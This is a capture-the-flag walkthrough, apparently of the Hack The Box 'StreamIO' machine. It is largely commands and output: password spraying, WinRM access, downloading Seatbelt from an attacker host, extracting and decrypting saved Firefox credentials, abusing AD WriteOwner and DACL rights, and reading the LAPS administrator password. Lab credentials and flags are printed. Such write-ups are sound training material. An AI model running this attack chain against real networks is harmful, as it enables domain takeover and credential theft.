The credentials for the domain user "nikk37" actually worked! Which means we finally got valid domain credentials.

```
nxc smb streamio.htb -u users.txt -p passwords.txt --continue-on-success
```

Downloaded domain information using rusthound-ce.

```
rusthound-ce --domain streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

Started up bloodhound.

```
bloodhound-start
```

Enumerated SMB Shares, but no non-default SMB Shares were displayed.

```
nxc smb streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' --shares
```

Enumerated domain users and stored the output inside an newusers.txt file.

```
nxc smb streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com' --rid-brute > newusers.txt
```

Formatted the output properly, so we have an users.txt wordlist file for future bruteforcing.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Sprayed if we can access the DC via evil-winrm & we can!

```
nxc winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

Connected to the DC.

```
evil-winrm -i streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'               
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents>
```

Retrieved user.txt in C:\Users\nikk37\Desktop.

```
40a8afe3a2be1fc93b6a2b74ca286f14
```

## Privilege Escalation

Marked nikk37 as owned in BloodHound.

Enumerated groups and privileges of the current user, but couldn't find anything useful.

```
whoami /all
```

Enumerated installed applications.

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

I was able to identify Mozilla Firefox being ran, maybe we can get some credentials using Seatbelt.

```
iwr -uri http://10.10.14.57/Seatbelt.exe -OutFile Seatbelt.exe
```

Enumerated Firefox History, but couldn't find anything.

```
*Evil-WinRM* PS C:\Temp> ./Seatbelt.exe FirefoxHistory


                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== FirefoxHistory ======

ERROR: IO exception, places.sqlite file likely in use (i.e. Firefox is likely running). Could not find file 'C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\5rwivk2l.default\places.sqlite'.

    History (nikk37):

       https://support.mozilla.org
       https://www.mozilla.org
       https://www.mozilla.org/privacy/firefox/gro.allizom.www
[*] Completed collection in 0.179 seconds
```

I went to hacktricks and searched up for forensic methodologies regarding browser artifacts. There was an interesting "firefox_decrypt" github script referred, which allowed us to decrypt the master password. Let's download it.

```
git clone https://github.com/unode/firefox_decrypt.git
```

Now I just need to find out the master password for firefox.

I utilized AI to find where the master password is usually stored and found it inside the following absolute path:

```
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release>
```

The file is called "key4.db" and there it is! Let's download it onto our local machine & decrypt it using the firefox_decrypt.py script we got from GitHub.

```
download key4.db
```

Unfortunately the script didn't work. After that I had to research. Apparently I need to download another decrypting script called "firepwd".

```
git clone https://github.com/lclevy/firepwd
```

The GitHub README.md reveals that we most likely also need to the logins.json file which stores credentials (usernames & passwords) and the keys4.db file.

```
download logins.json
```

We now need to start an virtual environment, in order to install the required dependencies for the script.

```
python3 -m venv myenv
source myenv/bin/activate
```

Downloaded the dependencies.

```
pip install -r requirements.txt
```

Now I need to move the keys4.db and logins.json file into the current directory.

```
mv /ctfs/htb/ad/streamio/logins.json .
mv /ctfs/htb/ad/streamio/key4.db .
```

Ran the script.

```
python3 firepwd.py
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

As we can see we gained 4 passwords. Let's add them to our passwords.txt.

Sprayed users to see which users we got now. We got an valid hit for user "JDgodd"!

```
JDgodd:JDg0dd1s@d0p3cr3@t0r
```

Marked the user JDgodd as owned in BloodHound. Checked his ACL's and he seems to be having an Outbound Object Control ACL Active. "WriteOwner" for the "Core Staff" Group!

Abused the WriteOwner ACL & changed the OwnerSID to user's JDgodd.

```
impacket-owneredit -action write -new-owner JDgodd -target 'Core Staff' streamio.htb/JDgodd:'JDg0dd1s@d0p3cr3@t0r' -dc-ip 10.129.58.127
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
[*] - sAMAccountName: JDgodd
[*] - distinguishedName: CN=JDgodd,CN=Users,DC=streamIO,DC=htb
[*] OwnerSid modified successfully!
```

Add rights to user JDgodd to add users to the group.

```
impacket-dacledit -action write -rights WriteMembers -principal JDgodd -target 'Core Staff' streamio.htb/JDgodd:'JDg0dd1s@d0p3cr3@t0r' -dc-ip 10.129.58.127
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260818-174102.bak
[*] DACL modified successfully!
```

Successfully added JDgodd to the Core Staff Group.

```
net rpc group addmem 'Core Staff' JDgodd -U streamio.htb/JDgodd%'JDg0dd1s@d0p3cr3@t0r' -S 10.129.58.127
```

From here on I was stuck, so I decided to download bloodhound information using bloodhound-python, to maybe see ACL Path's which I didn't see before!

```
bloodhound-python -u nikk37 -p 'get_dem_girls2@yahoo.com' -ns 10.129.58.127 -d streamio.htb -c all
```

Uploaded this domain information AND BOOM! We discovered that the "Core Staff" Group has an ACL "ReadLAPSPassword" over the Domain Controller itself. 

Since we need to abuse an in-built PowerShell functionality for this, we'll need to add user "nikk37" to the Core Staff Group, since he is the only user we currently have which can connect to the DC via WinRM.

```
net rpc group addmem 'Core Staff' nikk37 -U streamio.htb/JDgodd%'JDg0dd1s@d0p3cr3@t0r' -S 10.129.58.127
```

Verified that it worked and it did!

```
whoami /groups
```

Tried to enumerate the password now, which usually can be found under the "ms-Mcs-AdmPwd" variable. But it didn't work.

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

Had to research and found that there is an module in nxc, which allows us to get the LAPS Password.

```
nxc ldap streamio.htb -u 'jdgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
LDAP        10.129.58.127   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.58.127   389    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r 
LAPS        10.129.58.127   389    DC               [*] Getting LAPS Passwords
LAPS        10.129.58.127   389    DC               Computer:DC$ User:                Password:I+#ID6nW2Za%D!
```

Connected to the DC as Administrator.

```
evil-winrm -i streamio.htb -u Administrator -p 'I+#ID6nW2Za%D!'
```

Retrieved root.txt in C:\Users\Martin\Desktop.

```
7f8ba37fe1d755b8010545e5484a5a11
```